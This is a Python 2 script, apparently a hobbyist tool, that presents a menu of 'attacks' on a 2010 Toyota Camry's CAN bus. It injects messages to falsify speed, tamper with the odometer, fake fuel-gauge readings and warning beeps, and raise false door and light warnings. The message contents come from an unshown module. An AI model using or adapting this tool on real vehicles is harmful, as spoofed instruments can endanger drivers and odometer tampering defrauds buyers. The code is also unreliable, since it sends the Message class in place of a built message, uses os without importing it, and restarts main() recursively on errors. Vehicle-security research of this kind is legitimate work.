import can
import time
import sys
from attackfunction import *
from can.interfaces.interface import Bus
from can import Message

can.rc['interface'] = 'socketcan_ctypes'


def showoptions():
    print "********* Welcome to Toyota Camry 2010-CAN Bus Hack **********"
    print "\n"
    print "\n1. Change Speed - 50km/ph."
    print "\n2. Change Speed - 100km/ph."
    print "\n3. Change Speed - 150km/ph."
    print "\n4. Change Speed - MAX."
    print "\n5. Change Speed - Send RANDOM speed data to change ODOMETER value."
    print "\n6. Change Fuel Gauge to FULL."
    print "\n7. Change Fuel Gauge to 3/4."
    print "\n8. Change Fuel Gauge to 1/2."
    print "\n9. Change Fuel Gauge to 1/4."
    print "\n10. Change Fuel Gauge to EMPTY and MAKE WARNING BEEP."
    print "\n11. Show warning for DRIVER DOOR OPEN."
    print "\n12. Show warning for PASSENGER DOOR OPEN."
    print "\n13. Show warning for REAR DOORS OPEN."
    print "\n14. Show warning for FRONT DOOR OPEN."
    print "\n15. CLOSE ALL warnings for DOOR OPEN."
    print "\n16. Turn HIGH-BEAM indicator ON."
    print "\n17. Turn HEAD-LAMP indicator ON."
    print "\n18. Turn INTERIOR-LIGHT indicator ON."
    print "\n19. Turn OFF ALL LIGHT indicators."
    print "\n>>. Type 'stop' to exit the program."

    choice = raw_input("\nWhat do you want to do??   >>")
    if choice == '':
        print "No input provided.\nPlease provide proper input"
        showoptions()
    if choice == 'stop' or choice == 'STOP':
        print "Stay safe."
        sys.exit(1)
    return choice


def main():
    can_interface = 'can1'
    bus = Bus(can_interface)

    attack_choice = showoptions()

    print attack_choice
    print "Attack initiated......"

    try:
        while(1):
            try:
                if attack_choice == '1':
                    changespeed_50()
                    bus.send(Message);

                elif attack_choice == '2':
                    changespeed_100()
                    bus.send(Message);

                elif attack_choice == '3':
                    changespeed_150()
                    bus.send(Message);

                elif attack_choice == '4':
                    changespeed_full()
                    bus.send(Message);

                elif attack_choice == '5':
                    changespeed_randomtrip()

                elif attack_choice == '6':
                    changefuel_full()
                    bus.send(Message);

                elif attack_choice == '7':
                    changefuel_threequarter()
                    bus.send(Message);

                elif attack_choice == '8':
                    changefuel_half()
                    bus.send(Message);

                elif attack_choice == '9':
                    changefuel_quarter()
                    bus.send(Message);

                elif attack_choice == '10':
                    changefuel_emptybeep()
                    bus.send(Message);

                elif attack_choice == '11':
                    open_driverdoor()
                    bus.send(Message);

                elif attack_choice == '12':
                    open_passengerdoor()
                    bus.send(Message);

                elif attack_choice == '13':
                    open_reardoors()
                    bus.send(Message);

                elif attack_choice == '14':
                    open_frontdoors()
                    bus.send(Message);

                elif attack_choice == '15':
                    close_alldoor()
                    bus.send(Message);

                elif attack_choice == '16':
                    highbeam()
                    bus.send(Message);

                elif attack_choice == '17':
                    headlamp()
                    bus.send(Message);

                elif attack_choice == '18':
                    interiorlight()
                    bus.send(Message);

                elif attack_choice == '19':
                    lightsoff()
                    bus.send(Message);

                else:
                    print "Invalid Choice. Please Re-enter correct choice."
                    time.sleep(2)
                    os.system('clear')
                    main()

            except KeyboardInterrupt:
                print "Attack Stopped"
                time.sleep(2)
                os.system('clear')
                main()

            except:
                print "Oops something went wrong!"
                time.sleep(2)
                os.system('clear')
                main()

    except KeyboardInterrupt:
        os.system('clear')
        main()

if __name__ == "__main__":
    main()

